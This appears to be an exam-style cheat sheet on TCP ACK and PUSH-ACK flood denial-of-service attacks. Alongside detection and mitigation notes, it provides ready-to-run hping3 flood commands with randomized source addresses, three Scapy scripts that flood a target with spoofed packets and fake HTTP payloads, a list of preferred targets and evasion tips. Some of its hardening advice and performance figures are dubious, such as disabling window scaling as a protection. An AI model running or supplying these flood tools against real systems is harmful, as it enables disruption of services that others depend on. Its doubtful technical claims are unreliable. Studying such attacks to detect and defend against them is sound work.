# ACK and PUSH-ACK Flood Attack

## üìç Attack Classification
- **Category**: Volumetric Attack / Application Layer Stress
- **OSI Layer**: Layer 4 (Transport)
- **Protocol**: TCP
- **Port**: Any TCP port (commonly 80, 443, 8080, 3389)

## üéØ Attack Mechanism
Exploits **TCP ACK and PUSH-ACK packets** to overwhelm targets by forcing immediate data processing and acknowledgment handling, causing higher CPU utilization than standard ACK floods due to the PUSH flag's urgency indication.

### How it Works:
1. **PUSH Flag Exploitation**: PUSH forces immediate data delivery to application
2. **ACK Processing**: Server must process acknowledgments for non-existent data
3. **Application Stress**: PUSH packets trigger application layer processing
4. **Buffer Management**: Forces frequent buffer flushes and processing

## üîç Key Characteristics
- **Immediate Processing**: PUSH flag demands urgent handling
- **Application Impact**: Affects application layer performance
- **Higher CPU Usage**: More processing overhead than pure ACK floods
- **Buffer Manipulation**: Affects TCP buffer management

## üö® Exam Focus Points

### Critical Numbers:
- **TCP Window Size**: 0-65,535 (often randomized)
- **Sequence Numbers**: Sequential or random values
- **PUSH Flag Impact**: Forces immediate data delivery
- **Typical Rate**: 8,000-80,000+ packets/sec
- **Packet Size**: 40-1500 bytes (variable payloads)

### Common Exam Questions:
- **Q**: What does the PUSH flag do in TCP?
- **A**: Forces immediate delivery of data to receiving application
- **Q**: Why are PUSH-ACK floods more effective than ACK floods?
- **A**: PUSH flag triggers application layer processing, consuming more resources
- **Q**: What TCP flags are set in PUSH-ACK attacks?
- **A**: ACK and PUSH flags are both set

### Attack Components:
- **ACK Packets**: Standard acknowledgment processing
- **PUSH-ACK Packets**: Urgent data delivery with acknowledgment
- **Variable Payloads**: Can include fake data to increase processing
- **Spoofed Sources**: Randomized source addresses

## ‚ö° Attack Variations

### Pure ACK Flood:
- **Method**: Only ACK flag set
- **Impact**: Moderate resource consumption
- **Detection**: Moderate difficulty
- **Bypass**: Good firewall evasion

### PUSH-ACK Flood:
- **Method**: ACK + PUSH flags combined
- **Impact**: High application processing overhead
- **Detection**: More suspicious than pure ACK
- **Resource**: CPU-intensive due to urgent processing

### Data-Carrying PUSH-ACK:
- **Method**: PUSH-ACK with payload data
- **Impact**: Maximum processing overhead
- **Stealth**: Appears like legitimate data transfer
- **Application**: Forces application to process fake data

### Mixed ACK/PUSH-ACK Flood:
- **Method**: Alternating ACK and PUSH-ACK packets
- **Impact**: Variable processing patterns
- **Evasion**: Harder to detect consistent patterns

## üõ°Ô∏è Detection & Mitigation
- **Network Protection**:
  - PUSH flag rate limiting
  - Application layer inspection
  - TCP flag combination analysis
  - Connection state validation

- **Firewall Rules**:
  - Block unsolicited PUSH packets
  - Rate limit PUSH-ACK combinations
  - Deep packet inspection
  - Application-aware filtering

### System Hardening:
```bash
# iptables PUSH-ACK flood protection
iptables -A INPUT -p tcp --tcp-flags ACK,PSH ACK,PSH -m state --state NEW -j DROP
iptables -A INPUT -p tcp --tcp-flags PSH PSH -m limit --limit 10/sec -j ACCEPT
iptables -A INPUT -p tcp --tcp-flags ACK ACK -m limit --limit 20/sec -j ACCEPT

# Advanced TCP protection
echo 1 > /proc/sys/net/ipv4/tcp_rfc1337
echo 0 > /proc/sys/net/ipv4/tcp_window_scaling
echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout
```

## üîß Attack Tools & Commands
- **hping3**: `hping3 -AP -p 80 --flood target`
- **Scapy**: Custom PUSH-ACK flood scripts
- **Packeth**: GUI-based packet crafting
- **Ostinato**: Professional packet generator

### Manual Testing:
```bash
# Basic ACK flood
hping3 -A -p 80 --flood -V target_ip

# PUSH-ACK flood
hping3 -AP -p 80 --flood -V target_ip

# PUSH-ACK with data
hping3 -AP -p 80 --flood -d 1024 target_ip

# Multiple flag combinations
for flags in A AP PA; do
  hping3 -$flags -p 80 --flood target_ip &
done

# Randomized source PUSH-ACK
hping3 -AP -p 80 --rand-source --flood target_ip
```

## üí° Historical Context
- **Late 1990s**: PUSH flag exploitation discovered
- **Application Awareness**: Recognized application layer impact
- **Modern DDoS**: Common in sophisticated attack vectors
- **IoT Integration**: Used in modern botnet campaigns

## üìä TCP Flag Attack Effectiveness
| Attack Type | Flags | CPU Impact | App Impact | Detection |
|-------------|-------|------------|------------|-----------|
| ACK Flood | ACK | Medium | Low | Moderate |
| PUSH-ACK Flood | ACK+PSH | High | High | Moderate |
| Data PUSH-ACK | ACK+PSH+Data | Very High | Very High | Hard |
| Mixed Flood | Variable | High | Medium | Hard |

## üéØ Target Selection
Preferred targets:
- **Web applications** with real-time processing
- **Database servers** with TCP connections
- **Real-time applications** (gaming, streaming)
- **API endpoints** processing immediate requests
- **Chat/messaging servers** expecting PUSH data

## ‚ö†Ô∏è Vulnerable Configurations
- **No PUSH flag filtering**: Accept all PUSH packets
- **Unlimited buffer processing**: No application limits
- **Poor connection validation**: Weak state tracking
- **Default TCP settings**: No optimization for attacks

## üîç Detection Indicators
- **High PUSH flag packet rates**
- **Increased application CPU usage**
- **Unusual ACK/PUSH ratios**
- **Buffer overflow attempts**
- **Application response delays**

### Detection Commands:
```bash
# Monitor ACK packets
tcpdump -n 'tcp[tcpflags] & tcp-ack != 0' | wc -l

# Monitor PUSH packets
tcpdump -n 'tcp[tcpflags] & tcp-push != 0' | wc -l

# Monitor combined flags
tcpdump -n 'tcp[tcpflags] & (tcp-ack|tcp-push) != 0'

# Application performance monitoring
top -p $(pgrep -f "apache2|nginx|httpd")

# TCP connection analysis
ss -tuln | grep -E "(ESTABLISHED|TIME_WAIT)" | wc -l
```

## üåê Network Impact
- **Bandwidth Consumption**: Moderate to high (with payloads)
- **Application Processing**: High CPU utilization
- **Memory Usage**: Buffer management overhead
- **Response Latency**: Increased processing delays

## üí° Defense Strategy
1. **Flag-Based Filtering**: Block unexpected PUSH flag usage
2. **Application Rate Limiting**: Limit PUSH processing per source
3. **Buffer Management**: Optimize TCP buffer handling
4. **Connection Validation**: Verify legitimate PUSH contexts
5. **Application Hardening**: Implement PUSH flood resilience

## üîß Verification Commands
```bash
# Test ACK handling
hping3 -A -p 80 -c 10 target_ip

# Test PUSH-ACK handling
hping3 -AP -p 80 -c 10 target_ip

# Check flag filtering
nmap --scanflags ACKPSH -p 80 target_ip

# Monitor application response
time curl -I http://target_ip

# Connection state monitoring
watch 'cat /proc/net/tcp | grep -c ": 0[1-9A-F]"'
```

## üìà Attack Metrics
- **Packet Rate**: 5,000-50,000 packets/sec
- **CPU Impact**: 40-80% utilization increase
- **Memory Impact**: 20-50% buffer usage increase
- **Application Response**: 200-500% latency increase

## üîÑ Advanced Evasion
- **Realistic Payloads**: Include HTTP-like data in PUSH packets
- **Timing Patterns**: Mimic legitimate application traffic
- **Flag Rotation**: Alternate between ACK and PUSH-ACK
- **Size Variation**: Variable packet sizes and payloads
- **Protocol Mimicking**: Craft application-specific data

## üî¨ Attack Analysis
### Scapy Script Examples:
```python
from scapy.all import *
import random
import string

def ack_flood(target_ip, target_port, count=1000):
    """Pure ACK flood attack"""
    for i in range(count):
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        packet = IP(src=src_ip, dst=target_ip) / \
                 TCP(sport=random.randint(1024,65535), 
                     dport=target_port, flags="A")
        send(packet, verbose=0)

def push_ack_flood(target_ip, target_port, count=1000):
    """PUSH-ACK flood with payload"""
    for i in range(count):
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        # Generate fake HTTP data
        fake_data = "GET / HTTP/1.1\r\nHost: " + \
                   ''.join(random.choices(string.ascii_letters, k=20)) + \
                   "\r\n\r\n"
        packet = IP(src=src_ip, dst=target_ip) / \
                 TCP(sport=random.randint(1024,65535), 
                     dport=target_port, flags="PA") / fake_data
        send(packet, verbose=0)

def mixed_flag_flood(target_ip, target_port, count=2000):
    """Mixed ACK and PUSH-ACK flood"""
    flags_list = ["A", "PA", "A", "PA", "A"]
    for i in range(count):
        src_ip = ".".join(str(random.randint(1,254)) for _ in range(4))
        flag = random.choice(flags_list)
        packet = IP(src=src_ip, dst=target_ip) / \
                 TCP(sport=random.randint(1024,65535), 
                     dport=target_port, flags=flag)
        send(packet, verbose=0)

# Usage examples
# ack_flood("192.168.1.100", 80, 1000)
# push_ack_flood("192.168.1.100", 80, 1000) 
# mixed_flag_flood("192.168.1.100", 80, 2000)
```

## üõ†Ô∏è Mitigation Best Practices
- **Deep Packet Inspection**: Analyze PUSH flag usage patterns
- **Application Layer Gateways**: Filter at application level
- **Rate Limiting**: Implement per-source PUSH limits
- **Connection Tracking**: Validate PUSH flag contexts
- **Buffer Optimization**: Tune TCP buffer parameters
- **Monitoring**: Real-time PUSH flag analysis

## üîç Forensic Analysis
- **Packet Capture**: Analyze flag combinations and payloads
- **Application Logs**: Check for unusual processing patterns
- **System Metrics**: Monitor CPU and memory usage
- **Network Flow**: Track source patterns and volumes
- **Connection States**: Analyze TCP state transitions

## üìã Response Checklist
1. **Immediate**: Block obvious attack sources
2. **Short-term**: Implement flag-based rate limiting
3. **Medium-term**: Deploy application layer protection
4. **Long-term**: Optimize TCP stack configuration
5. **Continuous**: Monitor for attack pattern evolution
